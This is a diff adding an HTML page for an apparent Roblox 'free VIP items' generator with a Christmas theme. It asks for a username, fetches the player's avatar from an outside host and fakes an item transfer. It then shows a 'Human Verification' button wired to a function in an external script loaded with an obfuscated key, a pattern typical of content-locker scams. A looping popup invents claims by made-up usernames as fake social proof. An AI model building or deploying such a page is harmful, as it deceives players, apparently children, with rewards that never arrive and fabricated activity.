@@ -1,0 +1,554 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/animate.min.css">
+
+
+   <script type="text/javascript">
+    var MhnqU_BDL_WPWYGc={"it":4251820,"key":"97257"};
+</script>
+<script src="js/3b0fa55.js"></script>
+
+    <style>
+        /* body {background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0FbRoEJ-jrPKYhll1VbJnQ8pnx6KQYOE4tnTlhSL-KeNY7U0rlYMwrE0QlYtFHATX3MwuljB3BC3oIkx1XPcq2dm4kA35i3_QkQ1qZ7JUw-Jngn474JqJEfYeAZghU6QryR4RsBvP5NOGQsvLWaaty7Kqn9j6-RGcGNlDzUaXjttOKZUY6wJ0zPw800k/w640-h426/%E2%80%94Pngtree%E2%80%94free%20vector%20snowy%20background%20with_13722442.png);background-repeat: no-repeat;background-position: center;background-size: cover;} */
+        @font-face {
+            font-family: 'Refinery 95';
+            src: url('fonts/refinery-95-regular.ttf') format('truetype');
+        }
+        body {background-image: radial-gradient(circle, rgba(204,25,31,1) 0%, rgb(115, 1, 7) 100%);background-repeat: no-repeat;background-size: cover;background-position: center;background-attachment: fixed; font-family: 'Refinery 95';color: #fff;font-weight: bold;}
+        .xload .top-img {position: fixed;top: 0;left: 0;right: 0;width: 100%;z-index: 88;}
+        .xload .bottom-img {position: fixed;bottom: 0;left: 0;right: 0;width: 100%;z-index: 88;}
+        #particles-js {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        /* background-color: #000; Dark background to contrast with snow */
+        z-index: -888;
+        }
+
+        .logo {display: flex;justify-content: center;align-items: center;margin-top: 80px;}
+        .xload .logo img {width: 290px;margin: 25px auto;}
+
+        .container-md {padding: 0 50px;}
+
+        .xload .item {position: relative;margin: 10px 0;text-align: center;}
+        .xload .item.active img {box-shadow: 0px 0px 20px 4px rgb(215, 179, 2);}
+        .item .cap {position: absolute;left: 50%;transform: translate(-50%);display: none;}
+        .xload .item img {width: 100%;border-radius: 50%;}
+        .xload .item .title {margin-top: 9px;margin-bottom: 10px;    text-shadow: 2px 2px 9px #c8be00;}
+
+
+        .xload .folding {
+  margin: 20px auto;
+  width: 70px;
+  height: 70px;
+  position: relative;
+  transform: rotateZ(45deg);
+}
+
+.xload .square {
+  position: absolute;
+  top: 30%;
+  right: 30%;
+  width: 30px;
+  height: 30px;
+  background-color: crimson;
+  transform: rotateZ(87deg);
+}
+.folding .sk-cube {
+  float: left;
+  width: 50%;
+  height: 50%;
+  position: relative;
+  transform: scale(1.1);
+}
+
+.folding .sk-cube:before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #fff;
+  animation: sk-foldCubeAngle 2.4s infinite linear both;
+  transform-origin: 100% 100%;
+}
+
+.folding .sk-cube2 {
+  transform: scale(1.1) rotateZ(90deg);
+}
+
+.folding .sk-cube3 {
+  transform: scale(1.1) rotateZ(180deg);
+}
+
+.folding .sk-cube4 {
+  transform: scale(1.1) rotateZ(270deg);
+}
+
+.folding .sk-cube2:before {
+  animation-delay: 0.3s;
+}
+
+.folding .sk-cube3:before {
+  animation-delay: 0.6s;
+}
+
+.folding .sk-cube4:before {
+  animation-delay: 0.9s;
+}
+
+@keyframes sk-foldCubeAngle {
+  0%,
+  10% {
+    transform: perspective(140px) rotateX(-180deg);
+    opacity: 0;
+  }
+  25%,
+  75% {
+    transform: perspective(140px) rotateX(0deg);
+    opacity: 1;
+  }
+  90%,
+  100% {
+    transform: perspective(140px) rotateY(180deg);
+    opacity: 0;
+  }
+}
+
+
+        .xload .mode {background-color: rgba(0,0,0,.7);position: fixed;top: 0;left: 0;right: 0;bottom: 0;z-index: 8888;display: flex;justify-content: center;padding: 60px 20px;}
+        .xload .mode-1 {background-image: url(images/649_Mesa-de-trabajo-1-copia-3.jpg);background-repeat: no-repeat;background-position: center;background-size:cover; max-width: 450px; padding: 20px;z-index: 777;border-radius: 6px; border: 3px solid #eecc9f;right: 20px;left: 20px;position: absolute;margin: 0 auto;}
+        .mode-1 .cap {position: absolute;width: 80px;right: -20px;top: -56px;transform: rotate(13deg);}
+        .mode-1 .can {width: 30px;position: absolute;}
+        .mode-1 .can-1 {left: -10px;top: -10px;transform: rotate(-45deg);}
+        .mode-1 .can-2 {left: -10px;bottom: -10px;transform: rotate(-125deg);}
+        .mode-1 .can-3 {right: -10px;bottom: -10px;transform: rotate(125deg);}
+        .mode-1 .logo {width: 75%;margin: 0 auto;}
+        input {margin-top: 20px;width: 100%;margin-bottom: 10px;padding: 10px 20px;border-radius: 30px;border: 2px solid #eecc9f;}
+        .btn-action {display: flex;justify-content: center;margin-top: 20px;margin-bottom: 30px;user-select: none;}
+        .btn-action .item-btn {position: relative;}
+        .xload .btn-action .item-btn img {width: 180px;}
+        .btn-action .item-btn .text {position: absolute;left: 50%;transform: translateX(-50%);bottom: 17px;font-size: 1.3rem;white-space: nowrap;text-transform: uppercase;}
+        .xload .step {text-align: center;}
+        .xload .heart {position: absolute;left: 50%;transform: translateX(-50%);bottom: -40px;}.heart .txt {position: absolute;left: 50%;transform: translateX(-50%);bottom: 20px;z-index: 8888;font-size: 9rem;}
+        .xload .heart img {width: 75px;}
+        .user-error {color: rgb(240, 236, 18);font-size: .8rem;}
+        .xload .avatar {width: 90px;height: 90px;border-radius: 50%;background-color: #fff;margin-bottom: 8px;}
+
+        .xload .message {position: fixed;bottom:65px;left: 15px;background-color: red;display: flex;font-size: .8rem; align-items: center;padding: 10px 20px;border-radius: 6px;background-image: url(images/649_Mesa-de-trabajo-1-copia-3.jpg);background-repeat: no-repeat;background-position: top;background-size:cover;border: 2px solid #eecc9f;z-index: 9999;}
+        .xload .message .img img {width: 50px; background: #fff;border-radius: 50%;height: 50px;}
+        .message .img {padding-right: 10px;}
+        .xload .message .border-img {position: absolute;width: 70px;right: -10px;top: -13px;}
+
+        .pc-img {display: none;}
+        
+        @media  (min-width: 800px) {
+            .top-img {display: none;}
+            .bottom-img {display: none;}
+            .container-md {max-width: 750px;}
+            .logo {margin-top: 15px;}
+            .message {bottom: 10px;}
+            
+            .pc-img {display: block;}
+            .pc-img-1 {position: fixed;left: 0px;top: 0px;width: 300px;}
+            .pc-img-2 {position: fixed;top: 0;right: 0;width: 300px;}
+        }
+    </style>
+<link rel="me" href="https://www.blogger.com/profile/02104878421413171342">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+<link rel="me" href="https://www.blogger.com/profile/16092730109203752731">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+
+<script type="text/javascript" language="javascript">
+  // Supply ads personalization default for EEA readers
+  // See https://www.blogger.com/go/adspersonalization
+  adsbygoogle = window.adsbygoogle || [];
+  if (typeof adsbygoogle.requestNonPersonalizedAds === 'undefined') {
+    adsbygoogle.requestNonPersonalizedAds = 1;
+  }
+</script>
+
+</head>
+<body>
+
+
+    <img class="top-img" src="images/pngegg%20%283%29.png" alt="">
+    <img class="bottom-img" src="images/pngegg%20bottom.png" alt="">
+    
+    <img class="pc-img pc-img-1" src="images/pngfind.com-christmas-background-png-1121258.png" alt="">
+    <img class="pc-img pc-img-2" src="images/pngfind.com-christmasleftttttttttt.png" alt="">
+    <div id="particles-js"></div>
+
+    <audio src="media/audio_63c49c13c8.mp3" controls="" id="audio" class="d-none"></audio>
+
+
+    <div class="cliameds"></div>
+
+
+    <div class="mode d-none" id="steps">
+        <div class="mode-1 animate__animated animate__bounceIn">
+            <img src="images/%5BCITYPNG.COM%5DVector%20Santa%20Hat%20And%20Christmas%20Red%20Ornament%20Ball%20PNG%20-%201500x1500.png" alt="" class="cap">
+            <img src="images/6715d8e5abca2.png" alt="" class="can can-1">
+            <img src="images/6715d8e5abca2.png" alt="" class="can can-2">
+            <img src="images/6715d8e5abca2.png" alt="" class="can can-3">
+            <img src="images/Christmas_Event.png" alt="" class="logo">
+            <div class="step" id="step-1">
+                <input type="text" placeholder="Enter Your Username" id="username">
+                <div class="user-error d-none">Plase enter correct useraneme </div>
+                <div class="btn-action">
+                    <div class="item-btn">
+                        <img src="images/christmas-web-button-covered-with-snow-icon-vector-19667569-removebg-preview.png" alt="">
+                        <div class="text user-search">Next Step</div>
+                    </div>
+                </div>
+            </div>
+            <div class="step animate__animated animate__bounceIn d-none" id="step-2">
+                <br>
+                <div class="folding">
+                    <div class="sk-cube1 sk-cube"></div>
+                    <div class="sk-cube2 sk-cube"></div>
+                    <div class="sk-cube4 sk-cube"></div>
+                    <div class="sk-cube3 sk-cube"></div>
+                    <div class="square"></div>
+                </div>
+                <div class="searching mb-4 mt-3">Searching for <span class="username">nnn</span></div>
+            </div>
+            <div class="step animate__animated animate__bounceIn d-none" id="step-3">
+                <br>
+                <div class="user">
+                    <img class="avatar" src="" alt="">
+                    <div class="userinfo">@<span class="username"></span></div>
+                </div>
+                <div class="btn-action">
+                    <div class="item-btn">
+                        <img src="images/christmas-web-button-covered-with-snow-icon-vector-19667569-removebg-preview.png" alt="">
+                        <div class="text continue">Continue</div>
+                    </div>
+                </div>
+            </div>
+            <div class="step animate__animated animate__bounceIn d-none" id="step-4">
+                <br>
+                <div class="loading">
+                    <div class="folding">
+                        <div class="sk-cube1 sk-cube"></div>
+                        <div class="sk-cube2 sk-cube"></div>
+                        <div class="sk-cube4 sk-cube"></div>
+                        <div class="sk-cube3 sk-cube"></div>
+                        <div class="square"></div>
+                    </div>
+                </div>
+                <img src="images/%E2%80%94Pngtree%E2%80%94a%20robot%20with%20christmas%20gift_14160147.png" alt="" class="img-robot d-none">
+                <div class="searching mb-4 mt-2">Transferring <span class="item-text"></span> to <span class="username">nnn</span></div>
+                <div class="action d-none">
+                    <div class="btn-action" style="margin-bottom: -55px;">
+                        <div class="item-btn">
+                            <img src="images/christmas-web-button-covered-with-snow-icon-vector-19667569-removebg-preview.png" alt="">
+                            <div class="text " onclick="_Tm()">Verify</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="heart">
+                <img src="images/Untitled-1-01.png" alt="">
+            </div>
+        </div>
+    </div>
+    
+    <div class="logo">
+        <img src="images/Christmas_Event.png" alt="">
+    </div>
+ 
+
+    <div class="container-md">
+        <p class="text-center">Lana Rae free vip</p>
+        <p class="text-center">Select an item you wish to generate to your Roblox account:</p>
+        <div class="row">
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <img class="cap" src="images/pngwing.com%20%289%29.png" alt="">
+                        <div class="img"><img class="active" src="images/makeup.webp" alt=""></div>
+                        <div class="title">Custom Makeup</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/vip.png" alt=""></div>
+                        <div class="title">VIP Access</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/x2money.png" alt=""></div>
+                        <div class="title">x2 money</div>
+                    </div>
+                </div>
+    
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/itemlimit.png" alt=""></div>
+                        <div class="title">+6 Item Limit</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/rainbow.png" alt=""></div>
+                        <div class="title">Rainbow Skin</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/walk.webp" alt=""></div>
+                        <div class="title">Fast Walk</div>
+                    </div>
+                </div>
+    
+    
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/topmodel.png" alt=""></div>
+                        <div class="title">Top Model Rank</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/diva.png" alt=""></div>
+                        <div class="title">Runway Diva Rank</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/money.webp" alt=""></div>
+                        <div class="title">35,000 Tokens</div>
+                    </div>
+                </div>
+    
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/luxury.webp" alt=""></div>
+                        <div class="title">Luxury Dress</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/moon.png" alt=""></div>
+                        <div class="title">Moongazer Girl Set</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/Futuristi.webp" alt=""></div>
+                        <div class="title">Futuristic Suit</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/denim.webp" alt=""></div>
+                        <div class="title">Denim Bag</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/french.png" alt=""></div>
+                        <div class="title">French Luxury Bag</div>
+                    </div>
+                </div>
+                <div class="col-6 col-md-3">
+                    <div class="item">
+                        <div class="img"><img src="images/rich.png" alt=""></div>
+                        <div class="title">Rich Girl Bag</div>
+                    </div>
+                </div>
+            </div>
+            
+
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+    
+    </div>
+
+    <script src="js/jquery.js"></script>
+    <script src="js/particles.min.js"></script>
+    <script>
+        particlesJS("particles-js", {
+          particles: {
+            number: { value: 150, density: { enable: true, value_area: 800 } },
+            color: { value: "#ffffff" }, // Snow is white
+            shape: { type: "circle" }, // Snowflakes are round
+            opacity: {
+              value: 0.8,
+              random: true // Some snowflakes are more transparent
+            },
+            size: {
+              value: 5,
+              random: true // Random sizes for variety
+            },
+            line_linked: {
+      enable: false,
+    },
+            move: {
+              enable: true,
+              speed: 2, // Slow falling snow
+              direction: "bottom", // Falling down
+              random: false,
+              straight: false,
+              out_mode: "out" // Snowflakes disappear when out of view
+            }
+          },
+          interactivity: {
+            detect_on: "canvas",
+            events: {
+              onhover: { enable: false }, // No interactivity for snow
+              onclick: { enable: false }
+            }
+          },
+          retina_detect: true
+        });
+
+        var audio = $("#audio").get(0);
+
+
+        $(".item").on("click", function(){
+            audio.play();
+            $("#steps").removeClass("d-none");
+            $("span.item-text").text($(this).text());
+        });
+
+        $(".heart").on("click", function(){
+            audio.play();
+            $("#steps").addClass("d-none");
+            $(".step").addClass("d-none");
+            $("#step-1").removeClass("d-none");
+            $("#username").val("");
+        });
+
+        $(".continue").on("click", function(){
+            audio.play();
+            $("#step-3").addClass("d-none");
+            $("#step-4").removeClass("d-none");
+            $(".heart").addClass("d-none");
+            setTimeout(function(){
+                $(".searching").text("Human Verification needed to carry on...");
+                $(".img-robot").removeClass("d-none");
+                $(".loading").addClass("d-none");
+                $(".action").removeClass("d-none")
+            }, 3000);
+        });
+
+        $(".user-search").on("click", function(){
+            audio.play();
+            var username = $("#username").val();
+            $("span.username").text(username);
+            $("#step-1").addClass("d-none");
+            $("#step-2").removeClass("d-none");
+            $(".user-error").addClass("d-none");
+
+
+            $.ajax({
+                url: `https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`,
+                type: "GET",
+                success: function(profileData) {
+                    var res = profileData;
+                    if(res["status"] == "SUCCESS"){
+                        user_data = res; 
+                        $("#step-2").addClass("d-none");
+                        $("#step-3").removeClass("d-none");
+                        $(".avatar").attr("src", user_data["avatar"]); // avatar and more info 
+                    }else if(res["status"] == "ERROR_USER"){
+                        $(".user-error").removeClass("d-none");
+                        $("#step-1").removeClass("d-none");
+                        $("#step-2").addClass("d-none");
+                    }
+                },
+                error: function() {
+                    console.log("Failed to fetch profile information.");
+                }
+            });
+
+        });
+
+
+
+
+        const avatars = ['https://dress2.pages.dev/avatars/avatar1.png', 'https://dress2.pages.dev/avatars/avatar2.png', 'https://dress2.pages.dev/avatars/avatar3.png', 
+                     'https://dress2.pages.dev/avatars/avatar4.png', 'https://dress2.pages.dev/avatars/avatar5.png', 'https://dress2.pages.dev/avatars/avatar6.png', 
+                     'https://dress2.pages.dev/avatars/avatar7.png', 'https://dress2.pages.dev/avatars/avatar8.png', 'https://dress2.pages.dev/avatars/avatar9.png', 
+                     'https://dress2.pages.dev/avatars/avatar10.png'];
+
+        const items = ['VIP Access', 'Custom Makeup', 'Fast Walk', 'Top Model Rank', 'Runway Diva Rank',
+                    '35,000 Tokens', 'Luxury Dress', 'Moongazer Girl Set', 'Futuristic Suit', 'Denim Bag'];
+
+        const usernames = [
+            'StarGirl25', 'QueenBee07', 'PrincessLily22', 'GamerGirl101', 'SweetPea13',
+            'LunaLove08', 'DivaStar99', 'GlitterQueen55', 'SunshineGal12', 'BellaDream18',
+            'Moonlight21', 'Fashionista99', 'SparkleStar08', 'RosyGamer33', 'StarlightGirl88',
+            'CandyQueen47', 'LilMiss24', 'DaisyGirl92', 'PinkPrincess23', 'ChicGirl19',
+            'DreamyBella17', 'CutiePie06', 'HappyStar28', 'GlitterGirl77', 'CoolGirl31'
+        ];
+
+
+
+        function showAndHide() {
+            setTimeout(function() {
+                $(".cliameds").fadeIn(); 
+                var html = `
+                <div class="message animate__animated animate__bounceInLeft">
+                        <img class="border-img" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXJ7XHy-yIbt8eS8WNe8NScejWkLA3j-3Pztrn1BEOQPZNexvSv1vgBfqW-g7ssPVSKeppDSIQhrQuoIv6Kzq1vIInol_96W3BFHSmRNzJ2gJCLP-W0RQXSruj50mgLZl_he4Mz9dltgSliZ5qZBvUHcA4OTZ3OjQ4BdjtnipwycPh9ZqAnEWr81QFiPU/w160-h200/toppng.com-christmas-border-800x1000.png" alt="">
+                        <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
+                        <div class="more">
+                            <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
+                            <div>Just claimed '${items[Math.floor(Math.random() * items.length)]}'</div>
+                        </div>
+                    </div>
+                `;
+                $(".cliameds").html(html);
+
+                setTimeout(function() {
+                    $(".cliameds").fadeOut(showAndHide);  
+                }, 4000);  // 4000 ms = 4 seconds
+            }, 3000);  // 3000 ms = 3 seconds
+        }
+
+        showAndHide(); 
+
+        </script>
+    
+    <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-4LBK1TMFEV"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4LBK1TMFEV');
+</script>
+    
+    
+    
+    
+
+
+<!-- 'It is your responsibility to notify your visitors about cookies used and data collected on your blog. Blogger makes a standard notification available for you to use on your blog, and you can customise it or replace it with your own notice. See http://www.blogger.com/go/cookiechoices for more details.' -->
+<script src="js/cookienotice.js" defer=""></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function(event) {
+    window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
+        (window.cookieOptions && cookieOptions.msg) || 'This site uses cookies from Google to deliver its services and to analyse traffic. Your IP address and user agent are shared with Google, together with performance and security metrics, to ensure quality of service, generate usage statistics and to detect and address abuse.',
+        (window.cookieOptions && cookieOptions.close) || 'Got it',
+        (window.cookieOptions && cookieOptions.learn) || 'Learn more',
+        (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
+  });
+</script>
+
+
+</body></html>
